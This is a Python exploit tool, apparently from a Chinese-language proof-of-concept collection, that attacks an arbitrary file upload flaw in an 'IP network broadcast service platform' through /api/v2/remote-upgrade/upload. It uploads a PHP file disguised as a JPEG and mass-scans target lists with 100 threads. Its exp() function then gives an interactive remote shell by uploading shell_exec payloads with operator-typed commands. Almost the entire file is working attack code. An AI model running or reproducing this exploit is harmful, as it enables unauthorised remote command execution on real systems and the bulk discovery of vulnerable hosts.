# import sys
# import argparse
# import requests
# import logging
# import json
# from multiprocessing.dummy import Pool
#
# requests.packages.urllib3.disable_warnings()
# # 设置日志记录
# logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# logger = logging.getLogger(__name__)
#
#
# def banner():
#     banner = r"""
#      .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.
# | .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
# | | _____  _____ | || |   _____      | || |    ______    | || |   ______     | || |  _________   | || | _____  _____ | |
# | ||_   _||_   _|| || |  |_   _|     | || |  .' ___  |   | || |  |_   _ \    | || | |_   ___  |  | || ||_   _||_   _|| |
# | |  | | /\ | |  | || |    | |       | || | / .'   \_|   | || |    | |_) |   | || |   | |_  \_|  | || |  | | /\ | |  | |
# | |  | |/  \| |  | || |    | |   _   | || | | |    ____  | || |    |  __'.   | || |   |  _|      | || |  | |/  \| |  | |
# | |  |   /\   |  | || |   _| |__/ |  | || | \ `.___]  _| | || |   _| |__) |  | || |  _| |_       | || |  |   /\   |  | |
# | |  |__/  \__|  | || |  |________|  | || |  `._____.'   | || |  |_______/   | || | |_____|      | || |  |__/  \__|  | |
# | |              | || |              | || |              | || |              | || |              | || |              | |
# | '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
#  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'
#
#
#     """
#     print(banner)
#
#
# def main():
#     banner()
#     parser = argparse.ArgumentParser(description="IP网络广播服务平台upload存在任意文件上传漏洞")
#     parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
#     parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')
#
#     args = parser.parse_args()
#     if args.url and not args.file:
#         poc(args.url)
#         # if poc(args.url):
#         #     exp(args.url)
#     elif args.file and not args.url:
#         url_list = []
#         with open(args.file, 'r', encoding='utf-8') as f:
#             for url in f.readlines():
#                 url_list.append(url.strip().replace('\n', ''))
#         mp = Pool(100)
#         mp.map(poc, url_list)
#         mp.close()
#         mp.join()
#     else:
#         logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")
#
#
# def poc(target):
#     payload = "/api/v2/remote-upgrade/upload"
#     headers = {
#         "Content-Length": "197",
#         "Cache-Control": "max-age=0",
#         "Upgrade-Insecure-Requests": "1",
#         "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1",
#         "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,"
#                       "likeGecko)Chrome/127.0.0.0Safari/537.36",
#         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,"
#                   "application/signed-exchange;v=b3;q=0.7",
#         "Accept-Encoding": "gzip,deflate",
#         "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
#         "Connection": "close",
#     }
#     data = ('------WebKitFormBoundarytiZYyyKkbwCxtHC1\r\nContent-Disposition: form-data; name="file"; '
#             'filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo('
#             ');?>\r\n------WebKitFormBoundarytiZYyyKkbwCxtHC1--')
#     proxies = {
#         'http': 'http://127.0.0.1:8080',
#         'https': 'https://127.0.0.1:8080'
#     }
#     try:
#         res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=5, proxies=proxies)
#         if res1.status_code == 200:
#             response_data = json.loads(res1.text)
#             file_link = response_data['result']['link']
#             res2 = requests.get(url=file_link, verify=False, timeout=5)
#             if res2.status_code == 200:
#                 logger.info(f"[+] {target} 存在任意文件上传漏洞")
#                 with open('wlgbre.txt', 'a', encoding='utf-8') as f:
#                     f.write(f"{target}\n")
#                     f.close()
#                 return True
#             else:
#                 logger.info(f"[-] {target} 不存在任意文件上传漏洞")
#                 return False
#     except Exception as e:
#         logger.error(f"[-] {target} 连接失败: {e}")
#         return False
#
#
# if __name__ == '__main__':
#     main()

import sys
import argparse
import requests
import logging
import json
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

# 设置日志记录
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

def banner():
    banner = r"""
  _              _             
 (_)            (_)            
  ___      _____ _ _ __   __ _ 
 | \ \ /\ / / _ \ | '_ \ / _` |
 | |\ V  V /  __/ | | | | (_| |
 |_| \_/\_/ \___|_|_| |_|\__,_|
                               
                               



                            version:1.1.0
                            author:fangwei   

    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="IP网络广播服务平台upload存在任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please enter your url')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        logger.info(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload = "/api/v2/remote-upgrade/upload"
    headers = {
        "Content-Length": "197",
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1",
        "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,"
                      "likeGecko)Chrome/127.0.0.0Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,"
                  "application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
        "Connection": "close",
    }
    data = ('------WebKitFormBoundarytiZYyyKkbwCxtHC1\r\nContent-Disposition: form-data; name="file"; '
            'filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php phpinfo('
            ');?>\r\n------WebKitFormBoundarytiZYyyKkbwCxtHC1--')
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'https://127.0.0.1:8080'
    }
    try:
        res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=5)
        if res1.status_code == 200:
            response_data = json.loads(res1.text)
            file_link = response_data['result']['link']
            res2 = requests.get(url=file_link, verify=False)
            if res2.status_code == 200:
                logger.info(f"[+] {target} 存在任意文件上传漏洞")
                with open('wlgbre.txt', 'a', encoding='utf-8') as f:
                    f.write(f"{target}\n")
                return True
            else:
                logger.info(f"[-] {target} 不存在任意文件上传漏洞")
                return False
        else:
            logger.info(f"[-] {target} 不存在任意文件上传漏洞")
            return False
    except Exception as e:
        logger.error(f"[-] {target} 连接失败: {e}")
        return False

def exp(target):
    while True:
        cmd = input("请输入要执行的命令（输入 q 退出）：")
        if cmd == "q":
            logger.info("正在退出,请等候……")
            break
        try:
            payload = "/api/v2/remote-upgrade/upload"
            headers = {
                "Content-Length": "197",
                "Cache-Control": "max-age=0",
                "Upgrade-Insecure-Requests": "1",
                "Content-Type": "multipart/form-data;boundary=----WebKitFormBoundarytiZYyyKkbwCxtHC1",
                "User-Agent": "Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,"
                              "likeGecko)Chrome/127.0.0.0Safari/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,"
                          "*/*;q=0.8,"
                          "application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip,deflate",
                "Accept-Language": "zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7",
                "Connection": "close",
            }
            data = ('------WebKitFormBoundarytiZYyyKkbwCxtHC1\r\nContent-Disposition: form-data; name="file"; '
                    'filename="1.php"\r\nContent-Type: image/jpeg\r\n\r\n<?php echo shell_exec("' + cmd + '"); ?>\r\n------WebKitFormBoundarytiZYyyKkbwCxtHC1--')
            proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'https://127.0.0.1:8080'
            }
            res1 = requests.post(url=target + payload, data=data, headers=headers, verify=False, timeout=5)
            if res1.status_code == 200:
                response_data = json.loads(res1.text)
                file_link = response_data['result']['link']
                res2 = requests.get(url=file_link + f"?cmd={cmd}", verify=False)
                if res2.status_code == 200:
                    logger.info(res2.text)
                else:
                    logger.error(f"[-] 请求 {file_link} 失败")
            else:
                logger.error(f"[-] 请求 {target} 失败")
        except Exception as e:
            logger.error(f"[-] 请求 {target} 时发生错误: {e}")

if __name__ == '__main__':
    main()
